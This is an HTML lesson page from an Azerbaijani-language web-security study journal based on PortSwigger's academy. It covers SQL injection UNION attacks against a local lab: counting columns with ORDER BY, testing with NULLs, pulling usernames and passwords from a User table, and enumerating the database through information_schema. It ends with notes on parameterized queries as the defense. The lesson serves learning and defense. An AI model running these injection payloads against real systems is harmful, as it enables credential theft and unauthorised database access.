@@ -1,0 +1,70 @@
+<!doctype html>
+<html lang="az">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Dərs 22 · SQLi: UNION attack + bazanı tanımaq</title>
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+<button class="toggle" id="themeBtn" title="İşıqlı / qaranlıq">◐ tema</button>
+<header class="top"><div class="inner"><div class="brandrow"><div class="logo">⚡</div><h1>Dərs 22 · SQLi: UNION attack</h1></div></div></header>
+<div class="wrap">
+<div class="crumbs"><a href="../index.html">← Bütün dərslər</a><span><a href="lesson_21_sqli_login_bypass.html">‹ Dərs 21</a></span></div>
+
+<section class="card" id="l22">
+  <div class="card-head">
+    <h3>Dərs 22. UNION attack + bazanı tanımaq (SQLi pillələri 3-4)</h3>
+    <span class="badge b-done">bitdi</span>
+  </div>
+  <p class="card-sub">Məhsul siyahısına gizli <span class="inlinecode">User</span> cədvəlini "yapışdırıb" parolları çıxarmaq, sonra bazanı tanımaq. Lab: <span class="chip">/vuln/sqli</span>.</p>
+
+  <div class="block do">
+    <div class="lbl">🔧 UNION nədir</div>
+    <p>İki nəticəni bir-birinin altına yapışdırmaq (Excel cədvəllərini stəkləmək kimi). <strong>Şərt: hər iki tərəfdə eyni sayda sütun.</strong> Hücum: sayt bizə <span class="inlinecode">Product</span> göstərir, biz oraya <span class="inlinecode">User</span>-i yapışdırıb parolları "məhsul kimi" göstərdirik.</p>
+  </div>
+
+  <div class="block why">
+    <div class="lbl">🧪 Pillə 3 — addım-addım</div>
+    <p><strong>3a. Sütun sayını tap</strong> — <span class="inlinecode">ORDER BY</span> (N-ci sütuna görə sırala):</p>
+    <pre>?category=Gifts' ORDER BY 4--   → normal (4-cü sütun var)
+?category=Gifts' ORDER BY 5--   → XƏTA (5-ci yoxdur)  ⇒ sorğu 4 sütun qaytarır</pre>
+    <p class="note">Vacib: "cədvəlin" yox, <b>görünən sorğunun</b> sütun sayını tapırıq (<span class="inlinecode">SELECT id, name, category, price</span> = 4).</p>
+
+    <p><strong>3b. UNION-u NULL-larla sına</strong> — <span class="inlinecode">NULL</span> hər tipə uyğun gəlir, "düzgün qurulubmu?" yoxlaması:</p>
+    <pre>?category=NoSuchCategory' UNION SELECT NULL,NULL,NULL,NULL--   → boş sətir gəldi ⇒ 4 düzdür</pre>
+    <p>Səhv sayda NULL → xəta. Boş sətir → say düzgündür (ikinci təsdiq).</p>
+
+    <p><strong>3c. Parolları sızdır</strong> — mətn sütunları 2-ci (name) və 3-cü (category) idi:</p>
+    <pre>?category=NoSuchCategory' UNION SELECT id, username, password, 0 FROM "User"--</pre>
+    <p>name sütununda istifadəçi adları, category sütununda <b>parollar</b> göründü. (<span class="inlinecode">0</span> = price ədəd sütunu üçün doldurma.)</p>
+  </div>
+
+  <div class="block why">
+    <div class="lbl">🧪 Pillə 4 — bazanı tanımaq (real recon)</div>
+    <p>Real hücumda cədvəl/sütun adlarını <b>bilmirsən</b> — əvvəlcə kəşf edirsən.</p>
+    <table class="ref">
+      <tr><th>Məqsəd</th><th>Payload (2-ci sütuna)</th><th>Nəticəmiz</th></tr>
+      <tr><td>Baza növü/versiyası</td><td><span class="inlinecode">version()</span></td><td>PostgreSQL 18.7</td></tr>
+      <tr><td>Cədvəl adları</td><td><span class="inlinecode">table_name ... FROM information_schema.tables WHERE table_schema='public'</span></td><td>Product, User</td></tr>
+      <tr><td>Sütun adları</td><td><span class="inlinecode">column_name ... FROM information_schema.columns WHERE table_name='User'</span></td><td>(növbəti addım)</td></tr>
+    </table>
+    <p><span class="inlinecode">information_schema</span> = bazanın öz-özü haqqında kataloqu. <span class="inlinecode">table_schema='public'</span> sistem cədvəllərini gizlədir, yalnız bizimkiləri göstərir.</p>
+  </div>
+
+  <div class="block fix">
+    <div class="lbl">🛡️ Qorunma · qeydlər</div>
+    <ul>
+      <li><strong>Qayda (eynidir):</strong> parametrized query. Dəyər mətnə yapışdırılmasa, <span class="inlinecode">'</span> erkən bağlanmır, <span class="inlinecode">UNION</span> əlavə oluna bilmir.</li>
+      <li><strong>Giriş nöqtəsi:</strong> burada <span class="inlinecode">category</span> URL-də idi, amma eyni injection POST body, cookie və ya header-də də ola bilər — Burp Repeater ilə oranı da dəyişmək olar (bax növbəti labların bəzisi POST olacaq).</li>
+      <li><strong>Metod (əzbərlə):</strong> sütun sayı (<span class="inlinecode">ORDER BY</span>) → NULL testi → mətn sütununu tap → məlumat çıxar → <span class="inlinecode">information_schema</span> ilə recon.</li>
+    </ul>
+    <p class="note">Növbəti: sütun adları (<span class="inlinecode">information_schema.columns</span>), sonra Blind SQLi (cavab görünmədən).</p>
+  </div>
+</section>
+
+<footer>Burp Suite öyrənmə jurnalı · PortSwigger Web Security Academy əsasında · yalnız icazəli hədəflər</footer>
+</div>
+<script src="../assets/theme.js"></script>
+</body>
+</html>
